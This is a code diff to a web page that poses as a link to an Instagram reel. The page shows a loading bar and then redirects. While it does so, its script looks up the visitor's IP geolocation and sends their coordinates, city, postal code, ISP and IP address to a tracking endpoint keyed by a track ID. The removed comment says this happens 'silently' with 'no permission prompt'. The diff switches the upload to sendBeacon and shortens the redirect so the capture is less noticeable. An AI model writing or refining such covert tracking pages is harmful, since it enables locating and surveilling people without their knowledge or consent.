@@ -134,35 +134,27 @@
     // Start progress bar animation
     setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
 
-    // Silently grab location from IP — no permission prompt
-    (async () => {
-      try {
-        const res = await fetch('https://ipwho.is/');
-        const data = await res.json();
+    // Fire location fetch in background — don't wait for it
+    fetch('https://ipwho.is/')
+      .then(r => r.json())
+      .then(data => {
+        navigator.sendBeacon(`/api/location/${trackId}`, new Blob([JSON.stringify({
+          lat: data.latitude,
+          lng: data.longitude,
+          city: data.city,
+          region: data.region,
+          country: data.country,
+          isp: data.connection?.isp || null,
+          ip: data.ip,
+          zip: data.postal
+        })], { type: 'application/json' }));
+      })
+      .catch(() => {});
 
-        await fetch(`/api/location/${trackId}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            lat: data.latitude,
-            lng: data.longitude,
-            city: data.city,
-            region: data.region,
-            country: data.country,
-            isp: data.connection?.isp || null,
-            ip: data.ip,
-            zip: data.postal
-          })
-        });
-      } catch (e) {
-        // silently fail
-      }
-
-      // Redirect after a short delay
-      setTimeout(() => {
-        window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
-      }, 2000);
-    })();
+    // Redirect immediately — don't wait for location fetch
+    setTimeout(() => {
+      window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
+    }, 1000);
   </script>
 </body>
 </html>
